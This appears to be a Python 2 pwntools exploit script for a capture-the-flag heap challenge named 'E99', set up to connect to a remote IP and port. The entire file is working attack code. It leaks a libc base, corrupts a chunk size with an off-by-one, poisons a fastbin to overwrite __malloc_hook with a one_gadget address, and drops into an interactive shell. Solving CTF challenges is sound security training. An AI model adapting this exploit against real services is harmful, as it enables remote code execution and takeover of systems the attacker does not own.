#!/usr/bin/python2
from PwnContext.core import *
binary = './E99'
debug_libc = './libc-2.23.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 1


if local == 1 :
    p = remote("47.103.214.163","20302")
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    p = ctx.start()




def add(size,content):
    p.sendlineafter(':','1')
    p.sendlineafter('size?',str(size))
    p.sendafter('content:',content)

def delete(index):
    p.sendlineafter(':','2')
    p.sendlineafter('index?',str(index))


def show(idx):
    p.sendlineafter(':','3')
    p.sendlineafter('index?',str(idx))

def edit(idx,content):
    p.sendlineafter(':','4')
    p.sendlineafter('index?',str(idx))
    p.sendafter("content:",content)

add(0x98,"A\n")
add(0x38,"/bin/sh\n") #1
add(0x38,"/bin/sh\n") # 2
add(0x68,"/bin/sh\n")  #3
delete(0)
add(0x98,"\n")  #0
show(0)
libcs = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) -0x3c4b0a
print "libcbase:" + hex(libcs)
system = libcs + 0xf1147#libc.sym["system"] # 0x4526a 0xf02a4 0xf1147  0x45216
print "system:" + hex(system)
edit(1,'A' * 0x38 +"\xb1")
delete(2)
delete(3)
add(0xa8,"C"*0x38+p64(0x71)+p64(libcs+libc.sym["__malloc_hook"]-0x13)+"\n")
add(0x68,"cyberh\n")
add(0x68,"\x00"*3 + p64(system)+"\n")
p.sendlineafter(':', '1')
p.sendlineafter('size?', str(0x68))
p.interactive()
